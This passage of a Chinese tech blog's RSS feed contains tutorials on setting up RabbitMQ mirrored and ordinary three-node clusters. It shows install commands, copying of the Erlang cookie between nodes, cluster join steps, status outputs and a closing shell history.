<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit2 ~]# rabbitmqctl cluster_status</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Cluster</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[{nodes,[{disc,[rabbit@rabbit1,rabbit@rabbit2,rabbit@rabbit3]}]},</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {running_nodes,[rabbit@rabbit3,rabbit@rabbit1,rabbit@rabbit2]},</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {cluster_name,</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&lt;&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"rabbit@rabbit1"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&gt;&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">},</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {partitions,[]}]</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit2 ~]#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit3 ~]# rabbitmqctl cluster_status</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Cluster</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[{nodes,[{disc,[rabbit@rabbit1,rabbit@rabbit2,rabbit@rabbit3]}]},</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {running_nodes,[rabbit@rabbit1,rabbit@rabbit2,rabbit@rabbit3]},</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {cluster_name,</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&lt;&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"rabbit@rabbit1"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&gt;&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">},</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {partitions,[]}]</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit3 ~]#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>6. 配置高可用队列</h3>
<h4>添加高可用规则</h4>
<p></p>
<p></p>
<p></p>
<p>确保在所有节点上配置镜像队列策略，所有节点策略保持一致，这样即使某个节点宕机，消息仍能在集群内传递。</p>
<h4>配置队列</h4>
<p></p>
<h2>结论</h2>
<p>现在你已经成功搭建了一个由三个节点组成的RabbitMQ镜像集群，该集群能够提供高可用性和容错能力，适合生产环境部署。</p>
]]></content:encoded>
    </item>
    <item>
      <title>RabbitMQ普通集群搭建指南</title>
      <link>https://www.geekery.cn/note-book/RabbitMQ/RabbitMQ%E6%99%AE%E9%80%9A%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97.html</link>
      <guid>https://www.geekery.cn/note-book/RabbitMQ/RabbitMQ%E6%99%AE%E9%80%9A%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97.html</guid>
      <source url="https://www.geekery.cn/rss.xml">RabbitMQ普通集群搭建指南</source>
      <description>RabbitMQ普通集群搭建指南 目标架构 本次搭建的目标是构建一个由三个节点组成的RabbitMQ集群，节点信息如下： rabbit02: IP地址 192.168.10.132 rabbit03: IP地址 192.168.10.133 rabbit04: IP地址 192.168.10.134 预备工作 在开始之前，确保所有节点上都已安装Rabb...</description>
      <pubDate>Tue, 23 Jul 2024 05:43:49 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>目标架构</h2>
<p>本次搭建的目标是构建一个由三个节点组成的RabbitMQ集群，节点信息如下：</p>
<ul>
<li><strong>rabbit02</strong>: IP地址 <code>192.168.10.132</code></li>
<li><strong>rabbit03</strong>: IP地址 <code>192.168.10.133</code></li>
<li><strong>rabbit04</strong>: IP地址 <code>192.168.10.134</code></li>
</ul>
<h2>预备工作</h2>
<p>在开始之前，确保所有节点上都已安装RabbitMQ Server。如果尚未安装，可以通过以下命令进行安装：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> epel-release</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>同时，设置主机名和修改<code>/etc/hosts</code>文件以正确解析各节点的名称。</p>
<h2>同步.erlang.cookie</h2>
<p>为了允许节点间通信，需要确保所有节点上的.erlang.cookie文件内容相同。使用以下命令从<code>rabbit02</code>节点复制cookie到其他节点</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit02 ~]# scp /var/lib/rabbitmq/.erlang.cookie rabbit03:/var/lib/rabbitmq/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">The</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> authenticity</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'rabbit03 (192.168.10.133)'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> can't be established.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ECDSA key fingerprint is SHA256:ImtbIE2DzY9M7yqwTDfMn3EzHOjk0CGowUigMe00exk.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ECDSA key fingerprint is MD5:23:d8:46:37:71:8b:e3:56:d1:48:d4:f5:a9:64:80:f0.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Are you sure you want to continue connecting (yes/no)? yes</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Warning: Permanently added 'rabbit03,192.168.10.133' (ECDSA) to the list of known hosts.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">root@rabbit03's</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> password:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">.erlang.cookie</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                                                                             100%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">   20</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    24.5KB/s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   00:00</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit02 ~]# scp /var/lib/rabbitmq/.erlang.cookie rabbit04:/var/lib/rabbitmq/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">The</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> authenticity</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'rabbit04 (192.168.10.134)'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> can't be established.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ECDSA key fingerprint is SHA256:ImtbIE2DzY9M7yqwTDfMn3EzHOjk0CGowUigMe00exk.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">ECDSA key fingerprint is MD5:23:d8:46:37:71:8b:e3:56:d1:48:d4:f5:a9:64:80:f0.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Are you sure you want to continue connecting (yes/no)? yes</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Warning: Permanently added 'rabbit04,192.168.10.134' (ECDSA) to the list of known hosts.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">root@rabbit04's</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> password:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">.erlang.cookie</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">                                                                                                                                             100%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">   20</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    21.1KB/s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   00:00</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit02 ~]#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>集群配置</h2>
<p>在<code>rabbit03</code>和<code>rabbit04</code>上执行以下步骤：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit03 ~]# rabbitmqctl stop_app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Stopping</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit03</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit03 ~]# rabbitmqctl reset</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Resetting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit03</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit03 ~]# systemctl stop firewalld</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit03 ~]# rabbitmqctl join_cluster --ram rabbit@rabbit02</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Clustering</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit03</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> with</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit02</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit04 ~]# rabbitmqctl stop_app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Stopping</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit04</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit04 ~]# systemctl stop firewalld</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit04 ~]# rabbitmqctl stop_app</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Stopping</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit04</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit04 ~]# rabbitmqctl reset</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Resetting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit04</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit04 ~]# rabbitmqctl join_cluster --ram rabbit@rabbit02</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Clustering</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit04</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> with</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit02</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>最终确认</h2>
<p>在<code>rabbit02</code>上执行以下步骤来确认集群状态：</p>
<p>这表明集群已经成功建立，并且<code>rabbit02</code>作为磁盘节点，<code>rabbit03</code>和<code>rabbit04</code>作为RAM节点加入了集群。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit02 ~]# rabbitmqctl cluster_status</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Cluster</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit02</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[{nodes,[{disc,[rabbit@rabbit02]},{ram,[rabbit@rabbit04,rabbit@rabbit03]}]},</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {running_nodes,[rabbit@rabbit02]},</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {cluster_name,</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&lt;&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"rabbit@rabbit02"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">&gt;&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">},</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> {partitions,[]}]</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit02 ~]# </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit03 ~]# rabbitmqctl cluster_status</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Cluster</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit03</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[{nodes,[{disc,[rabbit@rabbit02]},{ram,[rabbit@rabbit03]}]}]</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit03 ~]# </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@rabbit03 ~]# rabbitmqctl cluster_status</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Cluster</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> node</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit@rabbit03</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ...</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[{nodes,[{disc,[rabbit@rabbit02]},{ram,[rabbit@rabbit03]}]}]</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">..</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.done.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>END</h2>
<p>一些有用没用的历史命令！！！可以不用看了</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> epel</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> ;</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">yum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vi</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/hosts</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">hostnamectl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> set-hostname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit02</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vi</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/hosts</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">find</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -name</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> *</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.cookie</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">man</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmq-server</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -detached</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">scp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/rabbitmq/.erlang.cookie</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit03:/var/lib/rabbitmq/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">scp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/rabbitmq/.erlang.cookie</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbit04:/var/lib/rabbitmq/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 400</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /var/lib/rabbitmq/.erlang.cookie</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> status</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rabbitmq-server.service</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">find</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -name</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> *</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">.cookie</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> firewalld</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">rabbitmqctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cluster_status</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">history</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"></span>
